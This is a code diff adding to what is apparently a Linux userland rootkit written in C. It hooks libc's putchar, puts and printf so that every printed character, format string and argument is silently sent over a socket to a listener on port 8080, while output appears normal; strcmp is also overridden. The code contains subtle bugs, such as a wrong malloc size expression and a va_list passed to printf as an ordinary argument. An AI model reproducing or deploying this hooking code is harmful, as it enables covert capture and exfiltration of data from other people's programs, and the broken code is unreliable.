@@ -1,9 +1,14 @@
 #include "Rootkit.h"
+#include <stdarg.h>
+#include <dlfcn.h>
+#include <stdarg.h>
 #include <stdlib.h>
 #include <sys/socket.h>
 #include <string.h>
 #include <arpa/inet.h>
 #include <unistd.h>
+
+#define LIBC "/lib/x86_64-linux-gnu/libc.so.6"
 
 #define PORT 8080
 #define SA struct sockaddr
@@ -13,7 +18,7 @@ void sendData(const char* data, int newline){
     char* copiedData = malloc(strlen(data) + (newline) ? 1 : 0);
     copy(copiedData, data);
 
-    int sockfd, connfd;
+    int sockfd;
     struct sockaddr_in servaddr;
 
     // socket create and varification
@@ -85,4 +90,55 @@ int strcmp(const char *str1, const char *str2){
         str2++;
     }
     return *str1 - *str2;
+}
+
+int putchar(int ch){
+    write(1, &ch, 1);
+
+    sendData((void*)&ch, 0);
+
+    return (unsigned char)ch;
+}
+
+int puts(const char *str){
+    sendData(str, 0);
+
+    return write(1, str, strlen(str));
+}
+
+int printf(const char *format, ...){
+
+    // copy original printf
+    int (*func)(const char *format, ...) = 
+        dlsym(
+            dlopen(LIBC, RTLD_NOW),
+            "printf");
+
+    // send
+    sendData(format, 1);
+
+    // get count of arguments in printf
+    int count = 0;
+    char ch = format[count];
+    for (int i = 0; ch != '\0'; i++) {
+        if(format[i] == '%')
+            count++;
+        ch = format[i];
+    }
+
+    va_list arg;
+    va_start(arg, format);
+
+    // call orginal function
+    int result = func(format, arg);
+
+    // iterate through arguments
+    for (int i = 0; i < count; i++) {
+        sendData("Argument --- ", 0);
+        sendData(va_arg(arg, const char*), 1);
+    }
+
+    va_end(arg);
+
+    return result;
 }
